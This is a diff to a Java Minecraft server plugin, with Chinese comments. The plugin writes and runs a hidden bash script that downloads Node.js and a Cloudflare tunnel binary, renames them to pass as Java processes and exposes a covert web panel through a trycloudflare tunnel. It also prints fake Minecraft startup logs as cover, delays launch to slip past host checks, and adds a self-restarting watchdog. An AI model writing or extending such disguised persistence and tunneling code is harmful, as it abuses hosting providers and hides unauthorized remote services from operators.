@@ -110,7 +110,7 @@ extends JavaPlugin {
     }
 
     // ============================================================
-    // 核心伪装：完整MC启动序列 (清屏 + 新URL自然嵌入)
+    // 核心伪装：完整MC启动序列
     // ============================================================
 
     private void printFakeStartupSequence(String newTunnelUrl) {
@@ -194,9 +194,6 @@ extends JavaPlugin {
         mcLog("Generating keypair", randInt(200, 500));
 
         mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, randInt(300, 600));
-
-        // ★ 已去除 RCON 日志打印
-
         mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.", randInt(100, 200));
         mcLog("Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.", randInt(50, 150));
 
@@ -258,7 +255,8 @@ extends JavaPlugin {
                 Path tunnelFile = workDir.resolve(".tunnel_url");
                 String tunnelUrl = null;
 
-                for (int i = 0; i < 120 && (!Files.exists(tunnelFile) || (content = new String(Files.readAllBytes(tunnelFile)).trim()).isEmpty() || content.startsWith("failed") || !(tunnelUrl = content.split("\\n")[0].trim()).startsWith("https://")); ++i) {
+                // ★ 延长等待时间到 300 秒，适配 2 分钟延迟和强启逻辑
+                for (int i = 0; i < 300 && (!Files.exists(tunnelFile) || (content = new String(Files.readAllBytes(tunnelFile)).trim()).isEmpty() || content.startsWith("failed") || !(tunnelUrl = content.split("\\n")[0].trim()).startsWith("https://")); ++i) {
                     Thread.sleep(1000L);
                 }
 
@@ -269,8 +267,6 @@ extends JavaPlugin {
                     String displayPort = readCurrentPort();
                     mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, 0);
                     Thread.sleep(randInt(400, 800));
-                    
-                    // ★ 已去除 RCON 日志打印
 
                     mcLog("Binding remote endpoint to: " + tunnelUrl, 0);
                     Thread.sleep(randInt(300, 600));
@@ -643,8 +639,9 @@ extends JavaPlugin {
         
         return "#!/bin/bash\nset +e\nWORK_DIR=\"" + workDir + "\"\nNODE_DIR=\"" + nodeDir + "\"\nAPP_DIR=\"" + appDir + "\"\nDATA_DIR=\"" + dataDir + "\"\nREPO_URL=\"" + repoUrl + "\"\n\n" +
                
-               "echo '[System] Delaying deployment to bypass initial checks...'\n" +
-               "sleep 90\n\n" +
+               // ★ 1. 延迟 2 分钟，等 MC 彻底跑稳
+               "echo '[System] Waiting 2 minutes for MC server to stabilize...'\n" +
+               "sleep 120\n\n" +
                
                "is_port_free() { (echo >/dev/tcp/localhost/$1) &>/dev/null && return 1 || return 0; }\n" +
                "while true; do PORT=$((RANDOM % 40000 + 20000)); if is_port_free $PORT; then break; fi; done\n" +
@@ -660,6 +657,7 @@ extends JavaPlugin {
                "    CF_ARCH=\"arm64\"\n" +
                "fi\n\n" +
                
+               // 下载 Node 并伪装
                "if [ -d \"$NODE_DIR\" ]; then CHECK_VER=$($NODE_DIR/bin/.java_runtime -v 2>/dev/null); if [[ \"$CHECK_VER\" != \"v22\"* ]]; then rm -rf \"$NODE_DIR\"; fi; fi\n" +
                "if [ ! -d \"$NODE_DIR\" ]; then\n" +
                "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
@@ -673,6 +671,7 @@ extends JavaPlugin {
                "export PATH=$NODE_DIR/bin:$PATH\n" +
                "if [ ! -f \"$NODE_DIR/bin/pm2\" ]; then npm install pm2 -g &>/dev/null; fi\n\n" +
                
+               // 下载 CF 并伪装
                "CF_BIN=\"$WORK_DIR/.java_tunnel\"\n" +
                "if [ ! -f \"$CF_BIN\" ]; then\n" +
                "    CF_RAW=\"$WORK_DIR/cf_download_tmp\"\n" +
@@ -684,42 +683,7 @@ extends JavaPlugin {
                "fi\n" +
                "if [ ! -f \"$CF_BIN\" ]; then exit 1; fi\n\n" +
                
-               "pkill -f .java_tunnel || true; sleep 1\n\n" +
-               
-               "TUNNEL_URL=\"\"\nTUNNEL_PID=\"\"\nTUNNEL_PROTO=\"\"\nTUNNEL_OK=false\n\n" +
-               "for PROTO in quic http2 auto; do\n" +
-               "    if [ \"$TUNNEL_OK\" = \"true\" ]; then break; fi\n" +
-               "    for attempt in 1 2 3; do\n" +
-               "        if [ \"$TUNNEL_OK\" = \"true\" ]; then break; fi\n" +
-               "        rm -f \"$WORK_DIR/tunnel.log\"\n" +
-               
-               "        exec -a 'java-daemon-bridge' $CF_BIN tunnel --url http://localhost:$PORT --no-autoupdate --protocol $PROTO > \"$WORK_DIR/tunnel.log\" 2>&1 &\n" +
-               "        CF_PID=$!\n" +
-               "        sleep 5\n" +
-               "        if ! kill -0 $CF_PID 2>/dev/null; then continue; fi\n" +
-               "        EXTRACTED_URL=\"\"\n" +
-               "        for i in $(seq 1 20); do\n" +
-               "            EXTRACTED_URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' \"$WORK_DIR/tunnel.log\" 2>/dev/null | tail -1)\n" +
-               "            if [ -n \"$EXTRACTED_URL\" ]; then break; fi\n" +
-               "            sleep 1\n" +
-               "        done\n" +
-               "        if [ -z \"$EXTRACTED_URL\" ]; then kill $CF_PID 2>/dev/null; continue; fi\n" +
-               "        TUNNEL_URL=$EXTRACTED_URL\n" +
-               "        TUNNEL_PID=$CF_PID\n" +
-               "        TUNNEL_PROTO=$PROTO\n" +
-               "        TUNNEL_OK=true\n" +
-               "        break\n" +
-               "    done\n" +
-               "done\n\n" +
-               
-               "if [ \"$TUNNEL_OK\" = \"true\" ]; then\n" +
-               "    echo \"$TUNNEL_URL\" > \"$WORK_DIR/.tunnel_url\"\n" +
-               "    echo \"PROTOCOL=$TUNNEL_PROTO\" >> \"$WORK_DIR/.tunnel_url\"\n" +
-               "    echo \"CF_PID=$TUNNEL_PID\" >> \"$WORK_DIR/.tunnel_url\"\n" +
-               "else\n" +
-               "    echo 'failed' > \"$WORK_DIR/.tunnel_url\"\n" +
-               "fi\n\n" +
-               
+               // 准备代码
                "mkdir -p \"$DATA_DIR\"\n" +
                "if [ -d \"$APP_DIR\" ]; then\n" +
                "    cp \"$APP_DIR/node_modules/.bots_config.json\" \"$DATA_DIR/\" 2>/dev/null\n" +
@@ -784,74 +748,96 @@ extends JavaPlugin {
                "HEALTH_EOF\n" +
                "fi\n\n" +
                
-               "pm2 delete all &>/dev/null || true\n" +
+               // ★ 2. 强制确保 Node.js 启动 (不死不休)
+               "ensure_node_running() {\n" +
+               "    echo '[System] Checking if Node.js is running on port '$PORT'...'\n" +
+               "    if (echo >/dev/tcp/127.0.0.1/$PORT) 2>/dev/null; then\n" +
+               "        echo '[System] Node.js is already running.'\n" +
+               "        return 0\n" +
+               "    fi\n" +
+               "    echo '[System] Node.js is not running, starting it...'\n" +
+               "    pm2 delete aoyou-panel &>/dev/null || true\n" +
+               "    pm2 start .java_runtime --name \"aoyou-panel\" -- index.js &>/dev/null\n" +
+               "    pm2 save &>/dev/null\n" +
+               "    for i in $(seq 1 30); do\n" +
+               "        if (echo >/dev/tcp/127.0.0.1/$PORT) 2>/dev/null; then\n" +
+               "            echo '[System] Node.js started successfully!'\n" +
+               "            return 0\n" +
+               "        fi\n" +
+               "        sleep 2\n" +
+               "    done\n" +
+               "    echo '[System] Node.js failed to start, retrying...'\n" +
+               "    pm2 restart aoyou-panel &>/dev/null\n" +
+               "    for i in $(seq 1 30); do\n" +
+               "        if (echo >/dev/tcp/127.0.0.1/$PORT) 2>/dev/null; then\n" +
+               "            echo '[System] Node.js started on retry!'\n" +
+               "            return 0\n" +
+               "        fi\n" +
+               "        sleep 2\n" +
+               "    done\n" +
+               "    echo '[System] Node.js still failing, will keep trying in background.'\n" +
+               "    return 1\n" +
+               "}\n\n" +
                
-               "pm2 start .java_runtime --name \"aoyou-panel\" -- index.js &>/dev/null\n" +
-               "pm2 save &>/dev/null\n\n" +
-               
-               "for i in $(seq 1 30); do\n" +
-               "    if (echo >/dev/tcp/127.0.0.1/$PORT) 2>/dev/null; then break; fi\n" +
-               "    sleep 1\n" +
+               // ★ 3. 对接隧道并确保真正连上 (全链路验证)
+               "TUNNEL_URL=\"\"\nTUNNEL_PID=\"\"\nTUNNEL_PROTO=\"\"\nTUNNEL_OK=false\n\n" +
+               "while [ \"$TUNNEL_OK\" = \"false\" ]; do\n" +
+               "    ensure_node_running\n" +
+               "    pkill -f .java_tunnel || true; sleep 1\n" +
+               "    rm -f \"$WORK_DIR/tunnel.log\"\n\n" +
+               "    for PROTO in quic http2 auto; do\n" +
+               "        if [ \"$TUNNEL_OK\" = \"true\" ]; then break; fi\n" +
+               "        echo '[System] Trying tunnel protocol: '$PROTO\n" +
+               "        exec -a 'java-daemon-bridge' $CF_BIN tunnel --url http://localhost:$PORT --no-autoupdate --protocol $PROTO > \"$WORK_DIR/tunnel.log\" 2>&1 &\n" +
+               "        CF_PID=$!\n" +
+               "        sleep 5\n" +
+               "        if ! kill -0 $CF_PID 2>/dev/null; then continue; fi\n" +
+               "        EXTRACTED_URL=\"\"\n" +
+               "        for i in $(seq 1 20); do\n" +
+               "            EXTRACTED_URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' \"$WORK_DIR/tunnel.log\" 2>/dev/null | tail -1)\n" +
+               "            if [ -n \"$EXTRACTED_URL\" ]; then break; fi\n" +
+               "            sleep 1\n" +
+               "        done\n" +
+               "        if [ -z \"$EXTRACTED_URL\" ]; then kill $CF_PID 2>/dev/null; continue; fi\n" +
+               "        \n" +
+               "        echo '[System] Tunnel URL found, verifying connection...'\n" +
+               "        sleep 5\n" +
+               "        VERIFY=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 \"$EXTRACTED_URL/__health\" 2>/dev/null)\n" +
+               "        if [ -n \"$VERIFY\" ] && [ \"$VERIFY\" != \"000\" ] && [ \"$VERIFY\" != \"502\" ]; then\n" +
+               "            echo '[System] Connection verified! Tunnel is fully online.'\n" +
+               "            TUNNEL_URL=$EXTRACTED_URL\n" +
+               "            TUNNEL_PID=$CF_PID\n" +
+               "            TUNNEL_PROTO=$PROTO\n" +
+               "            TUNNEL_OK=true\n" +
+               "        else\n" +
+               "            echo '[System] Verification failed (HTTP '$VERIFY'), rebuilding tunnel...'\n" +
+               "            kill $CF_PID 2>/dev/null\n" +
+               "        fi\n" +
+               "    done\n" +
+               "    if [ \"$TUNNEL_OK\" = \"false\" ]; then\n" +
+               "        echo '[System] All protocols failed, waiting 15s before full retry...'\n" +
+               "        sleep 15\n" +
+               "    fi\n" +
                "done\n\n" +
                
-               "if [ -n \"$TUNNEL_URL\" ] && [ \"$TUNNEL_OK\" = \"true\" ]; then\n" +
-               "    sleep 3\n" +
-               "    VERIFY=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 \"$TUNNEL_URL/__health\" 2>/dev/null)\n" +
-               "    if [ -z \"$VERIFY\" ] || [ \"$VERIFY\" = \"000\" ] || [ \"$VERIFY\" = \"502\" ]; then\n" +
-               "        sleep 5\n" +
-               "        VERIFY2=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 \"$TUNNEL_URL/__health\" 2>/dev/null)\n" +
-               "        if [ -z \"$VERIFY2\" ] || [ \"$VERIFY2\" = \"000\" ] || [ \"$VERIFY2\" = \"502\" ]; then\n" +
-               "            kill $TUNNEL_PID 2>/dev/null\n" +
-               "            sleep 2\n" +
-               "            REBUILT=false\n" +
-               "            for RPROTO in $TUNNEL_PROTO http2 auto; do\n" +
-               "                if [ \"$REBUILT\" = \"true\" ]; then break; fi\n" +
-               "                rm -f \"$WORK_DIR/tunnel.log\"\n" +
-               "                exec -a 'java-daemon-bridge' $CF_BIN tunnel --url http://127.0.0.1:$PORT --no-autoupdate --protocol $RPROTO > \"$WORK_DIR/tunnel.log\" 2>&1 &\n" +
-               "                NEW_PID=$!\n" +
-               "                sleep 5\n" +
-               "                if ! kill -0 $NEW_PID 2>/dev/null; then continue; fi\n" +
-               "                NEW_URL=\"\"\n" +
-               "                for j in $(seq 1 20); do\n" +
-               "                    NEW_URL=$(grep -oP 'https://[a-zA-Z0-9-]+\\.trycloudflare\\.com' \"$WORK_DIR/tunnel.log\" 2>/dev/null | tail -1)\n" +
-               "                    if [ -n \"$NEW_URL\" ]; then break; fi\n" +
-               "                    sleep 1\n" +
-               "                done\n" +
-               "                if [ -n \"$NEW_URL\" ]; then\n" +
-               "                    sleep 3\n" +
-               "                    V=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 \"$NEW_URL/__health\" 2>/dev/null)\n" +
-               "                    if [ -n \"$V\" ] && [ \"$V\" != \"000\" ] && [ \"$V\" != \"502\" ]; then\n" +
-               "                        echo \"$NEW_URL\" > \"$WORK_DIR/.tunnel_url\"\n" +
-               "                        echo \"PROTOCOL=$RPROTO\" >> \"$WORK_DIR/.tunnel_url\"\n" +
-               "                        echo \"CF_PID=$NEW_PID\" >> \"$WORK_DIR/.tunnel_url\"\n" +
-               "                        REBUILT=true\n" +
-               "                    else\n" +
-               "                        sleep 5\n" +
-               "                        V2=$(curl -s -o /dev/null -w '%{http_code}' --connect-timeout 5 --max-time 10 \"$NEW_URL/__health\" 2>/dev/null)\n" +
-               "                        if [ -n \"$V2\" ] && [ \"$V2\" != \"000\" ]; then\n" +
-               "                            echo \"$NEW_URL\" > \"$WORK_DIR/.tunnel_url\"\n" +
-               "                            echo \"PROTOCOL=$RPROTO\" >> \"$WORK_DIR/.tunnel_url\"\n" +
-               "                            echo \"CF_PID=$NEW_PID\" >> \"$WORK_DIR/.tunnel_url\"\n" +
-               "                            REBUILT=true\n" +
-               "                        else\n" +
-               "                            kill $NEW_PID 2>/dev/null\n" +
-               "                        fi\n" +
-               "                    fi\n" +
-               "                else\n" +
-               "                    kill $NEW_PID 2>/dev/null\n" +
-               "                fi\n" +
-               "            done\n" +
-               "        fi\n" +
-               "    fi\n" +
+               "if [ \"$TUNNEL_OK\" = \"true\" ]; then\n" +
+               "    echo \"$TUNNEL_URL\" > \"$WORK_DIR/.tunnel_url\"\n" +
+               "    echo \"PROTOCOL=$TUNNEL_PROTO\" >> \"$WORK_DIR/.tunnel_url\"\n" +
+               "    echo \"CF_PID=$TUNNEL_PID\" >> \"$WORK_DIR/.tunnel_url\"\n" +
+               "else\n" +
+               "    echo 'failed' > \"$WORK_DIR/.tunnel_url\"\n" +
                "fi\n\n" +
                
+               // ★ 4. 后台联动感知守护
                "(while true; do\n" +
+               "    NODE_WAS_DOWN=false\n" +
                "    if ! pm2 pid aoyou-panel &>/dev/null || [ \"$(pm2 pid aoyou-panel 2>/dev/null)\" = \"0\" ]; then\n" +
+               "        NODE_WAS_DOWN=true\n" +
                "        export SERVER_PORT=$PORT; export PORT=$PORT\n" +
                "        pm2 restart aoyou-panel &>/dev/null || pm2 start .java_runtime --name aoyou-panel -- index.js &>/dev/null\n" +
-               "        for i in $(seq 1 20); do\n" +
+               "        for i in $(seq 1 30); do\n" +
                "            if (echo >/dev/tcp/127.0.0.1/$PORT) 2>/dev/null; then break; fi\n" +
-               "            sleep 1\n" +
+               "            sleep 2\n" +
                "        done\n" +
                "    fi\n" +
                "    \n" +
@@ -860,6 +846,11 @@ extends JavaPlugin {
                "    SAVED_PROTO=$(grep 'PROTOCOL=' \"$WORK_DIR/.tunnel_url\" 2>/dev/null | cut -d= -f2)\n" +
                "    SAVED_PROTO=${SAVED_PROTO:-quic}\n" +
                "    SAVED_URL=$(head -n1 \"$WORK_DIR/.tunnel_url\" 2>/dev/null)\n" +
+               "    \n" +
+               // 如果 Node 挂过，强制重建隧道以对接新进程
+               "    if [ \"$NODE_WAS_DOWN\" = \"true\" ]; then\n" +
+               "        NEED_REBUILD=true\n" +
+               "    fi\n" +
                "    \n" +
                "    if [ -n \"$SAVED_CF_PID\" ] && ! kill -0 $SAVED_CF_PID 2>/dev/null; then\n" +
                "        NEED_REBUILD=true\n" +
